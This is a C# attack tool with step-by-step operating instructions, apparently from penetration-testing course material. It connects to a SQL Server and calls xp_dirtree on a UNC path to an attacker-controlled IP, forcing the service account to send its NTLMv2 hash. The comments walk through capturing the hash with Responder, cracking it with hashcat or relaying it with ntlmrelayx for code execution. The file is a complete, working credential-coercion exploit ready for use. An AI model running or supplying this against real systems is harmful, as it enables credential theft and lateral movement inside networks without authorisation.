// ================================================================
// Impersonate.cs — Minimal MSSQL xp_dirtree NTLM Hash Trigger
// ================================================================
// WHAT THIS DOES:
//   A minimal SQL Server tool that:
//     1. Connects to a SQL Server using Windows Integrated Authentication
//     2. Executes xp_dirtree with a UNC path pointing to your Kali machine
//     3. Closes the connection
//
//   The xp_dirtree call forces the SQL Server service account to initiate
//   an NTLM authentication attempt to your attacker machine (Responder or
//   Impacket smbserver), capturing the NTLMv2 hash of the SQL service account.
//
//   This is the simplest possible version of the NTLM coercion attack.
//   For a more feature-rich version, see mssql-runner.cs or sql-v2.cs.
//
// ----------------------------------------------------------------
// BEFORE YOU RUN — CHANGE THESE VALUES
// ----------------------------------------------------------------
//   String sqlServer = "dc01.corp1.com"   -> SQL Server FQDN or IP
//   String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";"
//                                          -> Change 192.168.119.120 to YOUR Kali IP
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /out:Impersonate.exe Impersonate.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "Impersonate", Framework: .NET Framework 4.x, click Create
//     3. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     4. Build -> Build Solution (Ctrl+Shift+B)
//     5. Find: bin\Debug\Impersonate.exe
//
// ----------------------------------------------------------------
// RUN — COMPLETE WORKFLOW
// ----------------------------------------------------------------
//
//   STEP 1 — Start Responder on Kali:
//     sudo responder -I eth0 -v
//     (Responder intercepts SMB authentication and captures hashes)
//
//   STEP 2 — Run Impersonate.exe on a Windows machine with network
//            access to the SQL Server:
//     .\Impersonate.exe
//
//   STEP 3 — Watch Responder for the captured hash:
//     [SMB] NTLMv2-SSP Client : 192.168.x.x
//     [SMB] NTLMv2-SSP Hash   : DC01$::CORP1:xxxx...
//
//   STEP 4 — Crack the hash offline:
//     hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
//
//   STEP 5 (alternative) — Relay the hash for immediate code execution:
//     Use impacket-ntlmrelayx instead of Responder:
//       impacket-ntlmrelayx -t smb://TARGET_IP -smb2support
//
// BEFORE RUNNING, CHANGE:
//   - sqlServer -> your target SQL Server hostname/IP
//   - The UNC path IP (192.168.119.120) -> YOUR Kali IP
// ================================================================
using System;

using System.Data.SqlClient;

  

namespace SQL

{

    class Program

    {

        static void Main(string[] args)

        {

            String sqlServer = "dc01.corp1.com";

            String database = "master";

  

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

  

            try

            {

                con.Open();

                Console.WriteLine("Auth success!");

            }

            catch

            {

                Console.WriteLine("Auth failed");

                Environment.Exit(0);

            }

  

            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";

            SqlCommand command = new SqlCommand(query, con);

            SqlDataReader reader = command.ExecuteReader();

            reader.Close();

  

            con.Close();

        }

    }

}